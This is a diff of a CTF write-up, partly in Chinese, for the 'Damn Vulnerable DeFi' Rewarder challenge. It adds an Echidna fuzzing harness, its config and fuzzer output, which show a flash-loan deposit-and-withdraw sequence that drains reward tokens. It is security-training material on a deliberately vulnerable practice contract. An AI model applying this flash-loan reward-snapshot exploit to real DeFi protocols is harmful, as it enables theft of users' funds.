@@ -533,6 +533,7 @@ it('Execution', async function () {
         }
 
         // IFlashLoanEtherReceiver.execute()
+        // some manual work to guide Echidna
         function execute() external payable {
             if (canWithdraw) {
                 pool.withdraw();
@@ -561,7 +562,7 @@ it('Execution', async function () {
 
     deployer: "0x10000"
     psender: "0x10000"
-    contractAddr: "0x10000" # only SideEntranceTest is the sender
+    contractAddr: "0x10000" # only the SideEntranceTest contract is the sender
     sender: ["0x10000"]
     ```
 
@@ -708,9 +709,173 @@ it('Execution', async function () {
 });
 ```
 
+### Using Echidna
+
+- 因为合约 `TheRewarderPool` 涉及到 `REWARDS_ROUND_MIN_DURATION`，所以在测试合约中使用了 `increaseTime()`，其它函数逻辑类似 [4. Side Entrance](#using-echidna-2)，能够 Fuzzing 出结果，不过 Hevm 不是必需的 uwu
+
+    ```js
+    function increaseTime() external {
+        hevm.warp(block.timestamp + 5 days);
+    }
+    ```
+
+!!! note "contracts/the-rewarder/TheRewarderTest.sol"
+
+    ```js
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.0;
+
+    import "./FlashLoanerPool.sol";
+    import "./TheRewarderPool.sol";
+
+    interface IHevm {
+        function warp(uint256) external;
+        function prank(address sender) external;
+    }
+
+    contract Deployer {
+        uint256 constant TOKENS_IN_LENDER_POOl = 1000000 ether;
+        uint256 constant DEPOSIT_AMOUNT = 100 ether;
+
+        FlashLoanerPool public pool;
+        TheRewarderPool public rewarder;
+
+        constructor() {
+            DamnValuableToken token = new DamnValuableToken();
+            pool = new FlashLoanerPool(address(token));
+            rewarder = new TheRewarderPool(address(token));
+
+            token.transfer(address(pool), TOKENS_IN_LENDER_POOl);
+            for (uint160 u = 0x20000; u < 0x60000; u += 0x10000) {
+                token.transfer(address(u), DEPOSIT_AMOUNT);
+            }
+        }
+    }
+
+    /// @dev run with `echidna . --contract TheRewarderTest --config the-rewarder.yml`
+    contract TheRewarderTest {
+        FlashLoanerPool pool;
+        TheRewarderPool rewarder;
+
+        DamnValuableToken token;
+        RewardToken rewardToken;
+
+        IHevm hevm;
+
+        uint256 constant REWARDS_ROUND_MIN_DURATION = 5 days;
+        uint256 constant TOKENS_IN_LENDER_POOl = 1000000 ether;
+        uint256 constant DEPOSIT_AMOUNT = 100 ether;
+
+        bool canDeposit;
+        bool canWithdraw;
+        bool canDistribute;
+
+        constructor() {
+            Deployer deployer = new Deployer();
+            pool = FlashLoanerPool(deployer.pool());
+            rewarder = TheRewarderPool(deployer.rewarder());
+            
+            token = DamnValuableToken(rewarder.liquidityToken());
+            rewardToken = rewarder.rewardToken();
+
+            hevm = IHevm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);   // addr from docs
+
+            // users deposit
+            for (uint160 u = 0x20000; u < 0x60000; u += 0x10000) {
+                hevm.prank(address(u));
+                token.approve(address(rewarder), DEPOSIT_AMOUNT);
+                hevm.prank(address(u));
+                rewarder.deposit(DEPOSIT_AMOUNT);
+            }
+
+            hevm.warp(block.timestamp + REWARDS_ROUND_MIN_DURATION);
+            for (uint160 u = 0x20000; u < 0x60000; u += 0x10000) {
+                hevm.prank(address(u));
+                rewarder.distributeRewards();
+            }
+        }
+
+        function setDeposit(bool _enabled) public {
+            canDeposit = _enabled;
+        }
+
+        function setWithdraw(bool _enabled) public {
+            canWithdraw = _enabled;
+        }
+
+        function setDistribute(bool _enabled) public {
+            canDistribute = _enabled;
+        }
+
+        function receiveFlashLoan(uint256 amount) external {
+            require(msg.sender == address(pool));
+
+            if (canDeposit) {
+                token.approve(address(rewarder), amount);
+                rewarder.deposit(amount);
+            }
+            if (canWithdraw) {
+                rewarder.withdraw(amount);
+            }
+            if (canDistribute) {
+                rewarder.distributeRewards();
+            }
+
+            token.transfer(address(pool), amount);
+        }
+
+        function flashLoan() external {
+            uint256 lastRewardsTimestamp = rewarder.lastRecordedSnapshotTimestamp();
+            require(block.timestamp >= lastRewardsTimestamp + REWARDS_ROUND_MIN_DURATION, "It's useless to call flashLoan if no rewards can be taken as ETH is precious.");  // Thus, no need to use hevm to warp time
+            pool.flashLoan(TOKENS_IN_LENDER_POOl);
+        }
+
+        function testBalance() public view {
+            assert(rewardToken.balanceOf(address(this)) < rewarder.REWARDS() * 99 / 100);
+        }
+
+    }
+    ```
+
+!!! note "the-rewarder.yml"
+
+    ```js
+    testMode: assertion
+
+    deployer: "0x10000"
+    psender: "0x10000"
+    contractAddr: "0x10000"
+    sender: ["0x10000"]
+    ```
+
+```bash
+$ echidna . --contract TheRewarderTest --config the-rewarder.yml 
+...
+receiveFlashLoan(uint256):  passed! 🎉
+setDistribute(bool):  passed! 🎉
+setDeposit(bool):  passed! 🎉
+flashLoan():  passed! 🎉
+setWithdraw(bool):  passed! 🎉
+testBalance(): failed!💥  
+  Call sequence:
+    setDeposit(true) from: 0x0000000000000000000000000000000000010000
+    *wait* Time delay: 434239 seconds Block delay: 16633
+    setWithdraw(true) from: 0x0000000000000000000000000000000000010000
+    flashLoan() from: 0x0000000000000000000000000000000000010000
+    testBalance() from: 0x0000000000000000000000000000000000010000
+
+Event sequence: Panic(1): Using assert.
+AssertionFailed(..):  passed! 🎉
+Unique instructions: 7102
+Unique codehashes: 6
+Corpus size: 3
+Seed: 5526863836465074544
+```
+
 ### 参考资料
 
 - [ERC20Snapshot](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot)
+- [controlling the unit testing environment - hevm](https://hevm.dev/controlling-the-unit-testing-environment.html#cheat-codes)
 
 ## 6. Selfie
 
